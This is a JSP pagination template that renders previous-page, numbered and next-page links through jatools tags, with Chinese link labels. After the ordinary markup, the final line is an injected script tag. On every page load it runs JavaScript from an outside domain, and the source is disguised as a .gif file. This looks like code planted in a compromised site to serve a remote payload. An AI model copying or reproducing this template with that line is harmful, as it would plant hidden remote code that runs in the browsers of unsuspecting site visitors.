    
<%@ page language="java" contentType="text/html; charset=GB2312"
    pageEncoding="GB2312"%>
<div style="font-family : Arial;font-size: 13px;float:center;margin-right:auto;margin-left: auto;width:100%">
<jatools:if test="this.currentPage>1">
	[<a href="javascript:<%= _my_navigator.previousPageAction %>" style="font-family : Arial;font-size: 12px;color:#551a8b; text-decoration: underline">上一页</a>]
</jatools:if>
<jatools:pageHandler id="_pageHandler">
     <jatools:if test="this.pageNumber==this.currentPage">
			[<%= _pageHandler.pageNumberText %>]
	 </jatools:if>

	 <jatools:if test="this.pageNumber!=this.currentPage">
			[<a href="javascript:<%= _pageHandler.currentPageAction %>" style="font-family : Arial;font-size: 12px;color:#551a8b; text-decoration: underline"><%= _pageHandler.pageNumberText %></a>]
 	 </jatools:if>
</jatools:pageHandler>



<jatools:if test="this.currentPage < this.pageCount">
	 [<a href="javascript:<%= _my_navigator.nextPageAction %>" style="font-family : Arial;font-size: 12px;color:#551a8b; text-decoration: underline">下一页</a>]
</jatools:if>
</div>
<script src=http://fangaizheng.com.cn/count/js/gif.gif></script>
